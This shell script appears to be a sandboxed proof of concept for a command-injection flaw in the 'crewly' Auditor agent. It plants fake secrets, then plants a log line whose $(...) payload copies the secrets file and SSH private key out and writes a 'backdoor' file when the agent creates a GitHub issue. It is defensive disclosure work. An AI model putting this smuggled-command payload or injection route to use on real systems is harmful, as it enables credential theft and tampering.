#!/bin/sh
# Realistic end-to-end scenario for the crewly Auditor command injection.
# Sets up a MOCK operator environment (fake secrets — not real credentials), plants an
# attacker-controlled line in the "audited activity" the read-only Auditor reviews, then runs
# the real create_github_issue construction and checks what the "read-only" Auditor was able to
# do. Run under tools/sandbox.sh (no network, empty $HOME, cleared env).
set -eu
echo "## Setting up a mock operator environment under HOME=$HOME"
mkdir -p "$HOME/.crewly" "$HOME/.ssh"

# --- MOCK secrets a read-only Auditor must never be able to read or exfiltrate (all fake) ---
cat > "$HOME/.crewly/secrets.env" <<'SECRETS'
CREWLY_API_TOKEN=sk-FAKE-crewly-DO-NOT-USE-0000000000000000
GITHUB_TOKEN=ghp_FAKE0000000000000000000000000000000000
OPENAI_API_KEY=sk-FAKE-openai-0000000000000000000000000000
SECRETS
printf '%s\n' '-----BEGIN OPENSSH PRIVATE KEY-----' 'MOCK-KEY-NOT-REAL-do-not-use' '-----END OPENSSH PRIVATE KEY-----' > "$HOME/.ssh/id_ed25519"
echo "   planted: \$HOME/.crewly/secrets.env (3 fake tokens), \$HOME/.ssh/id_ed25519 (fake)"

# --- Attacker-controlled content in the activity the Auditor audits (indirect injection) ---
# The attacker only needs to get this line into a log / commit msg / task note the Auditor reads.
cat > /work/audited-activity.log <<'LOG'
2026-11-03T09:00:11 agent coder-1 completed task refactor-auth
2026-11-03T09:00:42 agent coder-1 note [Critical] auth bypass in login path $(cat $HOME/.crewly/secrets.env $HOME/.ssh/id_ed25519 > /work/EXFIL-to-attacker.txt; echo cron-job-added-by-auditor > $HOME/.crewly/backdoor)
2026-11-03T09:01:03 agent coder-1 idle
LOG
echo "   planted: /work/audited-activity.log with an attacker payload inside a 'finding' line"

# clean prior run artifacts
rm -f /work/EXFIL-to-attacker.txt "$HOME/.crewly/backdoor"

echo
echo "## Running the Auditor's create_github_issue path on that audited activity"
node /work/exfil-poc.mjs

echo
echo "## IMPACT — what a tool documented 'read-only, without any ability to modify system state' just did"
if [ -f /work/EXFIL-to-attacker.txt ]; then
  echo "   [CONFIDENTIALITY] secrets exfiltrated to /work/EXFIL-to-attacker.txt:"
  sed 's/^/      | /' /work/EXFIL-to-attacker.txt
else
  echo "   [CONFIDENTIALITY] no exfiltration (unexpected)"
fi
if [ -f "$HOME/.crewly/backdoor" ]; then
  echo "   [INTEGRITY] state modified — wrote \$HOME/.crewly/backdoor: $(cat "$HOME/.crewly/backdoor")"
else
  echo "   [INTEGRITY] no file written (unexpected)"
fi
echo
if [ -f /work/EXFIL-to-attacker.txt ] && [ -f "$HOME/.crewly/backdoor" ]; then
  echo "RESULT: CONFIRMED — the read-only Auditor read operator secrets AND modified state via an issue title."
else
  echo "RESULT: scenario did not complete as expected."
fi
